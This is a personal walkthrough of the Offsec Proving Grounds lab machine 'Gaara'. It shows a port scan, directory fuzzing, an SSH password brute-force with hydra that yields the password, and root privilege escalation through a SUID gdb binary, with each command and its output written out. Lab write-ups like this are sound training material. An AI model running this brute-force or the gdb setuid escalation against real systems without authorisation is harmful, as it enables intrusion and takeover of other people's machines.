---
title: "Gaara"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Easy"
date: 2026-06-27
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 38c759b9275180dcbe88d78ea233a5ac
---

# Gaara

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(root㉿kali)-[~]
└─# sudo nmap -sC -sV -p- --min-rate=1000 -oA nmap/gaara 192.168.210.142
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-27 18:46 +0530
Warning: 192.168.210.142 giving up on port because retransmission cap hit (10).
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.21% done; ETC: 18:49 (0:02:13 remaining)
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 57.10% done; ETC: 18:49 (0:01:02 remaining)
Stats: 0:01:52 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.83% done; ETC: 18:49 (0:00:35 remaining)
Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.89% done; ETC: 18:49 (0:00:02 remaining)
Nmap scan report for 192.168.210.142
Host is up (0.13s latency).
Not shown: 64452 closed tcp ports (reset), 1081 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Fuzzing Directories

```bash
┌──(root㉿kali)-[~]
└─# ffuf -u "http://192.168.210.142/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.142/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 185ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 184ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 149ms]
:: Progress: [20481/20481] :: Job [1/1] :: 177 req/sec :: Duration: [0:01:55] :: Errors: 0 ::
                                                                                                              
```

## Brute-Forcing SSH

```bash
┌──(root㉿kali)-[~]
└─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.210.142 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-27 18:58:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.210.142:22/
 
[22][ssh] host: 192.168.210.142   login: gaara   password: iloveyou2
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 13 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-27 18:59:57

```

## Logging using SSH

```bash
┌──(root㉿kali)-[~]
└─# ssh gaara@192.168.210.142 
The authenticity of host '192.168.210.142 (192.168.210.142)' can't be established.
ED25519 key fingerprint is: SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.210.142' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
gaara@192.168.210.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ 

```

## Local.txt

```bash
gaara@Gaara:~$ ls
flag.txt  local.txt
gaara@Gaara:~$ cat local.txt 
db933a0876167a6dedb4f848be6dd079

```

## Privilege Esc

```bash
gaara@Gaara:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
gaara@Gaara:~$

$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
```

## Proof.txt

```bash
# cd /root
# ls
proof.txt  root.txts
# cat proof.txt
fb4bc92c4ddb1940c047dae42afb1b6f
```
